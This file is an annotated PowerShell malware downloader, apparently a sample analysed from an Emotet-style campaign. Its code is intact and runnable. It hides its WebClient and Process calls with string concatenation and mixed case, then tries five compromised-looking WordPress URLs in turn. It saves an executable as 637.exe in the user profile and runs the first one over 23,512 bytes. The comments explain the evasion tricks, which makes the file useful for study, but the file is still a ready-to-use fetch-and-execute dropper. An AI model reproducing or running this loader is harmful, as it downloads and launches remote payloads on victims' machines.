# --- Junk variables for obfuscation ---
$TAnupsuy='Kllmirkgacc';
$Httefemrkyapw = '637'; # Used as the dropped filename
$Tbhxnsphmbfj='Ufmunoutbech';

# 1. Build the on-disk path for the downloaded payload.
#    Path: C:\Users\<username>\637.exe
$Oyilseecfxzcn = $env:userprofile + '\' + $Httefemrkyapw + '.exe';

# --- More junk ---
$Wnbbgtanl='Nbdzjhzbsl';

# 2. Instantiate a WebClient. `new-object` is obfuscated via string concatenation
#    to evade naive signature matching.
$Kdszusdbssx = .('new'+'-objec'+'t') net.WeBclienT;

# 3. List of candidate download URLs, joined with '*' and split at runtime.
#    Redundancy: if one host is offline the loop falls through to the next.
$Zacfltdrckzu = 'https://laclinika.com/wp-admin/r42ar70/*https://thechasermart.com/wp-admin/7u93/*https://zamusicport.com/wp-content/Vmc/*https://zaloshop.net/wp-admin/8j0827/*https://www.leatherbyd.com/PHPMailer-master/q91l5u01353/'.Split('*');

# --- More junk ---
$Hdvzaacvgcg='Adcwrhtpjzmqu';

# 4. Iterate the URL list and try to fetch the payload from each.
foreach($Qkiuxryjwko in $Zacfltdrckzu)
{
    try
    {
        # 5. Download. `DownloadFile` is obfuscated with backticks + case mixing.
        $Kdszusdbssx."dOwNLOaD`F`iLe"($Qkiuxryjwko, $Oyilseecfxzcn);

        # 6. Sanity-check the file size (>= 23512 bytes). Filters out HTTP error
        #    pages served by hosts that are up but no longer host the payload.
        If ((Get-Item $Oyilseecfxzcn).Length -ge 23512)
        {
            # 7. Execute the payload. `Start` is obfuscated the same way.
            [Diagnostics.Process]::"St`aRt"($Oyilseecfxzcn);

            # Break on first successful download + execution.
            break;
        }
    }
    catch
    {
        # Swallow errors (unreachable host, timeout, etc.) and try the next URL.
    }
}
# --- More junk ---
$Dbjjrmunqkmbm='Isidmkqswrgey'
